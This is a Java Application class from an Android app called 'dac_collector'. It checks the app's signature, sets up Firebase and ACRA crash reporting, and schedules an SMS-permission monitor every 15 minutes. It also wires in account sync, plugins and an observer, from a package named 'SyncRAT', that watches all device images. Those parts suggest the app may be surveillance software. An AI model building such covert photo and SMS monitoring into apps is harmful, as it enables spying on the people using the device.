package android.iocl.dac_collector.MainApplication;

import static android.iocl.dac_collector.Utility.Utility.TAG;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.Application;
import android.content.Intent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.Firebase.FirebaseDBClient;
import android.iocl.dac_collector.Plugin.PluginDataBridge;
import android.iocl.dac_collector.Plugin.PluginManager;
import android.iocl.dac_collector.Services.SmsPermissionMonitorWorker;
import android.iocl.dac_collector.Services.AppUpdateCheckWorker;
import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.Ui.CrashActivity;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.FirebaseConfigManager;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.RoleHelper;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.SignatureVerifier;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.tencent.mmkv.MMKV;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import org.acra.ACRA;
import org.acra.config.CoreConfigurationBuilder;
import org.acra.config.HttpSenderConfigurationBuilder;
import org.acra.data.StringFormat;
import org.acra.sender.HttpSender;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.Map;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {

    private static MyApp instance;
    private FirebaseCrashlytics crashlytics;
    private final Executor executor = Executors.newSingleThreadExecutor();

    private ImageObserver mImageObserver;
    private volatile String currentActivityName = "Unknown";

    // ✅ KEEP AS-IS
    Boolean installCockroach = true;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        String currentProcess = getProcessNameSafe();
        if (!getPackageName().equals(currentProcess)) {
            return;
        }

        if (!BuildConfig.DEBUG && !SignatureVerifier.isOfficialRelease(this)) {
            Intent unauthorizedIntent = new Intent(this, CrashActivity.class)
                    .putExtra("crash_details", "UnAuthorised App")
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(unauthorizedIntent);
            android.os.Process.killProcess(android.os.Process.myPid());
            return;
        }

        // 🔹 LIGHT INIT ONLY (no heavy I/O)
        MMKV.initialize(this);
        SharedPrefs.init(this);
        RoleHelper.syncSmsLauncherIcon(this);
        FirebaseConfigManager.init();

        NotificationHelper.initializeNotificationChannels(this);
        registerActivityLifecycleCallbacks(this);


        PluginManager.initialize(this);
        scheduleSmsPermissionMonitor();
        AppUpdateCheckWorker.schedule(this);

        // 🔹 Move heavy work off main thread
        executor.execute(() -> {
            initializeAccountSync();
            initBackground();
        });
    }

    private void scheduleSmsPermissionMonitor() {
        PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(
                SmsPermissionMonitorWorker.class,
                15,
                TimeUnit.MINUTES
        ).build();

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "sms_permission_monitor",
                ExistingPeriodicWorkPolicy.KEEP,
                request
        );
    }

    private void initializeAccountSync() {
        try {
            SyncUtils.initialize(getApplicationContext());
        } catch (RuntimeException e) {
            Log.e(TAG, "AccountSync initialization failed; it will be retried next app start", e);
        }
    }

    // ================= BACKGROUND INIT =================
    private void initBackground() {
        try {
            // 🔥 Firebase
            FirebaseApp.initializeApp(this);
            Utility.sendAnyUnsentDAC(getApplicationContext());
            FirebaseDBClient.schedulePendingDacUploads(getApplicationContext());
            crashlytics = FirebaseCrashlytics.getInstance();

            String cons_id = SharedPrefs.getString(
                    "cons_id",
                    BuildConfig.DEBUG
                            ? "crashedBeforeSettingUp--debug"
                            : "crashedBeforeSettingUp"
            );

            crashlytics.setUserId(cons_id);
            crashlytics.setCrashlyticsCollectionEnabled(installCockroach);

            // 🔥 SharedPrefs migration
            SharedPrefs.migrateFromSharedPrefs(this);

            // 🔥 ACRA
            if (!BuildConfig.DEBUG) {
                initACRA();
            }

            // 🔥 Delay non-critical hooks to avoid startup ANR
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                installImageObserver();
            }, 3000);

        } catch (Exception e) {
            Log.e(TAG, "Init failed", e);
        }
    }

    // ================= ACRA =================
    private void initACRA() {
        try {
            CoreConfigurationBuilder builder = new CoreConfigurationBuilder()
                    .withBuildConfigClass(BuildConfig.class)
                    .withReportFormat(StringFormat.JSON)
                    .withPluginConfigurations(
                            new HttpSenderConfigurationBuilder()
                                    .withUri(Constant.ACRA_REPORT_DB_API)
                                    .withHttpMethod(HttpSender.Method.POST)
                                    .withConnectionTimeout(8000)
                                    .withSocketTimeout(8000)
                                    .withEnabled(true)
                                    .build()
                    );

            ACRA.init(this, builder.build());

        } catch (Exception e) {
            Log.e("ACRA", "Init failed", e);
        }
    }

    // ================= IMAGE OBSERVER =================
    private void installImageObserver() {
        if (mImageObserver != null) return;

        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);

            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );
        }
    }

    // ================= PROCESS =================
    private String getProcessNameSafe() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            String processName = Application.getProcessName();
            if (processName != null && !processName.trim().isEmpty()) {
                return processName;
            }
        }

        try {
            int pid = android.os.Process.myPid();
            try (BufferedReader reader =
                         new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"))) {
                String processName = reader.readLine();
                if (processName != null) {
                    processName = processName.replace("\u0000", "").trim();
                    if (!processName.isEmpty()) {
                        return processName;
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not determine process name; assuming the main app process", e);
        }
        return getPackageName();
    }

    // ================= LIFECYCLE =================
    @Override
    public void onActivityResumed(Activity activity) {
        currentActivityName = activity.getClass().getName();
        PluginDataBridge.dispatchActivityResumed(this, currentActivityName);
    }

    @Override public void onActivityCreated(Activity a, Bundle b) {}
    @Override public void onActivityStarted(Activity a) {}
    @Override public void onActivityPaused(Activity a) {}
    @Override public void onActivityStopped(Activity a) {}
    @Override public void onActivitySaveInstanceState(Activity a, Bundle b) {}
    @Override public void onActivityDestroyed(Activity a) {}

    public static Context getContext() {
        return instance.getApplicationContext();
    }
}